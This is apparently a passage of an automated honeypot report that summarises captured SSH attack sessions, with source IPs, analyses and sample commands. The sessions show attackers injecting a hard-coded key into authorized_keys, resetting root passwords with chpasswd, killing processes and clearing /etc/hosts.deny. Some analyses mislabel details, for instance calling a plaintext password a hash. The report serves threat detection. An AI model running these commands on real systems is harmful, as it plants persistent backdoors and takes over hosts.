... (+10 more)
```

---

### Pattern: 7da7e027fd83...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.172.153.100

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection and root privilege escalation  
**Objective:** Gain persistent root access on the target machine by adding a valid SSH key and resetting the root password.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to lock `.ssh` directory (prevent tampering).  
- Remove existing `.ssh`, create new one, inject RSA public key into `authorized_keys`.  
- `chmod -R go= ~/.ssh` to restrict group/others access.  
- `echo "root:OW8mCBbGqKlA"|chpasswd|bash` to set root password.  
- Process killing (`pkill -9 secure.sh`, `auth.sh`, `sleep`) and emptying `/etc/hosts.deny` to hide activity.  
- System reconnaissance commands (cpuinfo, memory, crontab, uname, top, whoami).  

**Indicators of Compromise (IOCs):**  
- IP: 45.172.153.100  
- RSA key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:OW8mCBbGqKlA"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 58a910011089...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 152.42.165.179

#### Analysis

**Attack Type:** Backdoor installation / SSH key injection  
**Objective:** Gain persistent remote access via SSH (root login) on the honeypot.  
**Techniques:**  
- Manipulated `.ssh` directory permissions (`chattr`, `lockr`, `chmod`) to secure it.  
- Injected a new RSA public key into `authorized_keys`.  
- Set root password using `chpasswd`.  
- Killed unrelated processes (`pkill -9 sleep`, etc.) to reduce noise.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **152.42.165.179** (Singapore).  
- RSA key string in the command: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"**  
- Root password: **`4NfnRpPvfk4l`**.  
**Threat Level:** High – the attacker successfully installed a backdoor with root access, enabling potential malicious activity.  
**Brief Summary:** The attacker injected an SSH key and set a new root password to establish a persistent backdoor on the honeypot, likely for remote control or further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:4NfnRpPvfk4l"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 3534a3aed83f...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 101.47.163.114

#### Analysis

**Attack Type:** Backdoor installation / credential theft  
**Objective:** Gain persistent remote access (via injected SSH key) and elevate privileges (root password change).  
**Techniques:**  
- Injected a public‑key into `~/.ssh/authorized_keys` to enable SSH login.  
- Altered file permissions (`chmod -R go= ~/.ssh`).  
- Set root password with `chpasswd`.  
- Disabled security by clearing `/etc/hosts.deny`, killing system processes, and removing temporary scripts.  
- Gathered system information (CPU, memory, OS, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **101.47.163.114** (Singapore).  
- Public SSH key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`.  
- Root password hash: `ZLNvoxLSJAwF` (used in `chpasswd`).  

**Threat Level:** **High** – sophisticated backdoor with privilege escalation and system tampering.  

**Brief Summary:** The attacker injected an SSH key, changed the root password, disabled security measures, and collected system data to establish a persistent remote access backdoor.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:ZLNvoxLSJAwF"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+6 more)
```

---

### Pattern: 4acfdb6d592e...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 45.78.219.22

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection & privilege escalation  
**Objective:** Gain remote SSH access with elevated privileges (root) on the target host.  
**Techniques:**  
- `chattr -ia .ssh` / `lockr -ia .ssh` to lock the `.ssh` directory.  
- Remove and recreate `.ssh`, then write a new public key into `authorized_keys`.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `echo "root:9yjwQ0ih4OPT"|chpasswd|bash` attempts to set root password.  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **45.78.219.22** (Singapore).  
- Public key string in `authorized_keys` (e.g., `ssh-rsa AAAAB3NzaC1yc2EAAAABJQ...`).  
- File path: `.ssh/authorized_keys`.  

**Threat Level:** **High** – root password change and SSH key injection allow full remote control.  

**Brief Summary:** The attacker injected a new SSH key into the system, attempted to set the root password, and performed reconnaissance of system resources, effectively establishing a backdoor for remote access.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:9yjwQ0ih4OPT"|chpasswd|bash
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
crontab -l
... (+9 more)
```

---

### Pattern: eb46afe79d03...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 123.59.7.18

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection & root credential manipulation  
**Objective:** Gain persistent root-level remote access on the honeypot.  
**Techniques:**  
- `chattr -ia` / `lockr -ia` to lock files (likely custom tool).  
- Creation of `.ssh/authorized_keys` with a hard‑coded RSA key.  
- `chmod -R go= ~/.ssh` to restrict permissions.  
- `chpasswd` to set root password (`root:arGSwl2TKuIz`).  
- Emptying `/etc/hosts.deny` (removing host restrictions).  
- Killing unrelated processes (`secure.sh`, `auth.sh`, `sleep`).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **123.59.7.18**  
- RSA key string in `.ssh/authorized_keys`: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File names: `.ssh/authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – root access, persistent backdoor, potential for further exploitation.  

**Brief Summary:** The attacker installed a hard‑coded SSH key and changed the root password to establish a persistent backdoor on the honeypot, effectively enabling remote root control.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:arGSwl2TKuIz"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: fe49ed0c4962...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**Attack Type:** Backdoor installation (SSH key injection) with reconnaissance  
**Objective:** Create remote access via a new SSH key and gather system information for profiling.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to hide the `.ssh` directory  
- `echo … > .ssh/authorized_keys` to inject an RSA public key  
- System‑info commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance.  
**Indicators of Compromise (IOCs):**  
- Attacker IP: **34.142.110.144**  
- Public SSH key string: `"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"`  
- File path: `.ssh/authorized_keys`  
**Threat Level:** Medium (backdoor creation without payload, but potential for remote exploitation).  
**Brief Summary:** The attacker injected a random SSH key into the honeypot’s `.ssh` directory to establish a backdoor while collecting system information for profiling.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "1\n9axmTNPCebqa\n9axmTNPCebqa"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "1\n9axmTNPCebqa\n9axmTNPCebqa\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 43af3adfbf43...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.198.215.66

#### Analysis

**Attack Type:**  
Backdoor installation / remote access compromise

**Objective:**  
Gain persistent SSH access with a custom key and elevate privileges to root.

**Techniques:**  
- **SSH Key Injection**: `echo "ssh-rsa ... > .ssh/authorized_keys`  
- **Root Password Reset**: `echo "root:Zwto3NyEjWSb"|chpasswd|bash`  
- **Permission Manipulation**: `chmod -R go= ~/.ssh`  
- **Process Termination & Host Denial**: `pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny`

**Indicators of Compromise (IOCs):**  
- Attacker IP: 154.198.215.66  
- SSH key fingerprint: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw==`  
- Root password: `Zwto3NyEjWSb`

**Threat Level:** High – attacker has gained root access and installed a persistent backdoor.

**Brief Summary:**  
The attacker injected an SSH key, reset the root password, and manipulated permissions to establish a permanent remote access point on the honeypot.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:Zwto3NyEjWSb"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: ae9a79137eb4...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 36.50.54.25

#### Analysis

**Attack Type:** Backdoor installation / remote access  
**Objective:** Gain persistent SSH access (root) by injecting an RSA key into `~/.ssh/authorized_keys` and resetting the root password.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`, `rm`, `mkdir`) to hide or lock files.  
- Injection of a hard‑coded SSH public key.  
- Password change via `chpasswd`.  
- Process killing (`pkill -9 secure.sh, auth.sh, sleep`).  
- System reconnaissance (CPU info, memory usage, uptime, etc.) to gather host details.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **36.50.54.25** (Vietnam).  
- RSA public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun...`.  
- File path: `~/.ssh/authorized_keys`.  
- Commands: `chattr -ia .ssh`, `lockr -ia .ssh`.  

**Threat Level:** **High** – root access and SSH key injection provide full control over the system.  

**Brief Summary:** The attacker established a backdoor by injecting an RSA key into the host’s SSH authorized_keys file, resetting the root password, and performing reconnaissance to gather system information.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:4PSCxcFSo7j0"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 7c05ea5a20b5...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 194.226.49.149

#### Analysis

**Attack Type:** Backdoor installation / credential takeover  
**Objective:** Gain remote root access by installing a new SSH key and resetting the root password; conceal activity by killing monitoring processes.  

**Techniques:**
- Manipulate `.ssh` directory (chmod, chattr, lockr) to hide changes.
- Inject a random RSA public key into `authorized_keys`.
- Reset root password via `chpasswd`.
- Kill suspicious scripts (`secure.sh`, `auth.sh`, `sleep`) and clear `/etc/hosts.deny`.
- Run system‑info commands for reconnaissance (CPU, memory, disk, crontab).

**Indicators of Compromise:**
- Attacker IP: **194.226.49.149**  
- RSA key string in `authorized_keys` (e.g., “ssh‑rsa AAAAB3NzaC1yc2EAAAABJQ…”)  
- File paths: `.ssh/authorized_keys`, `/etc/hosts.deny`.  

**Threat Level:** **High** – root access and SSH backdoor pose significant risk.  

**Summary:** The attacker installed a new SSH key and reset the root password, then attempted to hide their activity by killing monitoring scripts and clearing host denial lists, effectively creating a persistent remote control point.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:bPId4xFcxVuv"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: 2b2d02947b71...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 103.249.84.18

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote SSH access and gather system information for future exploitation.  
**Techniques:**  
- `chattr -ia` & `lockr -ia` to set immutable attributes on `.ssh`.  
- Creation of `.ssh` directory, echoing a public‑key into `authorized_keys`, and setting permissions (`chmod go=`).  
- Use of `passwd` to set a known password.  
- System‑info commands (cpuinfo, free, ls, crontab, w, uname, top, whoami, lscpu, df).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **103.249.84.18** (Malaysia)  
- Public key string: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "secret\nzwVip50rhsVa\nzwVip50rhsVa"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "secret\nzwVip50rhsVa\nzwVip50rhsVa\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 99abcad1e6bd...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 14.103.145.231

#### Analysis

**Attack Type:** Backdoor installation via SSH key injection + reconnaissance  
**Objective:** Gain remote access to the host and collect system‑information for further exploitation or botnet recruitment.  
**Techniques:**  
- Manipulation of `.ssh` directory (`chattr`, `lockr`) and creation of an authorized_keys file with a random RSA key.  
- Setting restrictive permissions (`chmod -R go= ~/.ssh`).  
- System‑info commands (`cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, `top`, `whoami`, `lscpu`, `df`) to gather hardware and OS details.  
- Attempted password change via `passwd` with echoed credentials.  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **14.103.145.231**  
- RSA key string inserted into `.ssh/authorized_keys`: `ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr`  
- Use of `lockr -ia .ssh` (potentially a custom tool for file locking).  

**Threat Level:** Medium – the attacker successfully installed a backdoor and gathered system data, but no payload download or cryptomining activity observed.  

**Brief Summary:** The attacker injected an SSH key into the honeypot’s `.ssh/authorized_keys`, secured the directory, and collected detailed system information to facilitate remote access and potential botnet recruitment.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\nNy5pWC2H6JOQ\nNy5pWC2H6JOQ"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\nNy5pWC2H6JOQ\nNy5pWC2H6JOQ\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 06980b08a817...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 34.142.110.144

#### Analysis

**Attack Type:** Backdoor installation / credential compromise  
**Objective:** Gain privileged access by installing an SSH key and resetting the root password, then gather system information for further exploitation.  

**Techniques & Tools:**  
- `chattr -ia` and `lockr -ia` to lock the `.ssh` directory (likely a custom tool).  
- Direct injection of a public‑key into `authorized_keys`.  
- `chpasswd` to set root password (`root:K8KMpYcRsNMN`).  
- System reconnaissance commands (`cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.).  

**Indicators of Compromise (IOCs):**  
- Attacker IP: **34.142.110.144**  
- Public key string inserted into `authorized_keys` (the RSA key shown).  
- File paths manipulated: `.ssh`, `authorized_keys`.  

**Threat Level:** Medium – the attacker successfully installs a backdoor and modifies root credentials, but no payload download or advanced persistence mechanisms were observed.  

**Summary:** The session shows an attacker installing an SSH key and resetting the root password to gain privileged access, while performing system reconnaissance for potential further exploitation.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo "root:K8KMpYcRsNMN"|chpasswd|bash
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts....
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
ls -lh $(which ls)
which ls
... (+10 more)
```

---

### Pattern: d429b2964168...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 154.198.215.66

#### Analysis

**Attack Type:**  
Backdoor installation via SSH key injection + system reconnaissance

**Objective:**  
Gain remote access through the injected SSH key and collect system information to prepare further exploitation or monitoring.

**Techniques & Tools Used:**
- `chattr`/`lockr` to hide `.ssh` directory
- `chmod -R go= ~/.ssh` to restrict permissions
- Echoing a hard‑coded RSA public key into `authorized_keys`
- System info commands (`cat /proc/cpuinfo`, `free`, `ls`, `crontab`, `uname`, etc.) for reconnaissance

**Indicators of Compromise (IOCs):**
- Attacker IP: **154.198.215.66**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File: `.ssh/authorized_keys`

**Threat Level:** Medium – the attacker successfully installed a backdoor and performed reconnaissance, indicating potential for remote exploitation.

**Brief Summary:**  
The attacker injected an SSH key into the honeypot’s `authorized_keys` file, hid the directory, and gathered system information, likely preparing for remote access or further attacks.

#### Sample Commands
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
lockr -ia .ssh
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7Vv...
cat /proc/cpuinfo | grep name | wc -l
echo -e "123\neDMm278Ymne3\neDMm278Ymne3"|passwd|bash
Enter new UNIX password: 
Enter new UNIX password:
echo "123\neDMm278Ymne3\neDMm278Ymne3\n"|passwd
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
... (+12 more)
```

---

### Pattern: 05c31fe6ef8d...
- **Sessions**: 1
- **Honeypot Type**: Cowrie
- **Unique Source IPs**: 1
- **Source IPs**: 194.226.49.149

#### Analysis

**Attack Type:** Remote backdoor installation (SSH key injection)

**Objective:** Gain persistent SSH access to the target system

**Techniques & Tools Used:**
- Creation of `.ssh` directory and insertion of a public‑key into `authorized_keys`
- Attempted password changes via `passwd`
- System reconnaissance commands (`uname`, `top`, `lscpu`, etc.) to gather host information

**Indicators of Compromise (IOCs):**
- Attacker IP: **194.226.49.149**  
- SSH public key string:  
  ```
  ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr
  ```
- File names: `.ssh`, `authorized_keys`

**Threat Level:** **High** – the attacker successfully installed a backdoor, enabling remote access with potential for further exploitation.

